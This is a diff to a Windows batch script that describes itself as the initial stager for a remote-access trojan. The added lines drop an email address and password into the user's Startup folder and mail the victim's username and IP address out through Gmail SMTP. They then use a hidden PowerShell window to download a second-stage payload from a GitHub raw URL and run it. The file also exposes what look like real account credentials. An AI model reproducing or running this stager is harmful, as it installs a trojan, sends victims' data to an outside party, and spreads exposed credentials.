@@ -2,10 +2,9 @@
 @REM initial stager for RAT
 @REM created by: Petros
 
-
-@REM setup smtp
-powershell $email = "websitepetros@gmail.com"; $password = "Peter1234!@#$"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "PetrosRAT: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredentials($email, $password); $smtp.Send($email, $email, $subject, $ip);
-
+@REM credentials
+set email_uname="websitepetros@gmail.com"
+set email_pword="Peter1234!@#$"
 
 @REM variables
 set "INITIALPATH=%cd%"
@@ -13,15 +12,19 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 
 @REM move into the startup folder
 cd "%STARTUP%"
+echo %email_uname% > email.txt
+echo %email_pword% > pass.txt
 
+
+@REM setup smtp
+powershell Send-MailMessage -From %email_uname% -To %email_uname% -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList %email_uname%, (ConvertTo-SecureString -String %email_pword% -AsPlainText -Force))
 
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/wget.cmd -OutFile wget.cmd"
-
+powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/stage1.cmd -OutFile stage1.cmd"
 
 @REM run payload  
-powershell ./wget.cmd
+powershell ./stage1.cmd
 
 @REM cd back to the initial directory
 cd "%INITIALPATH%"
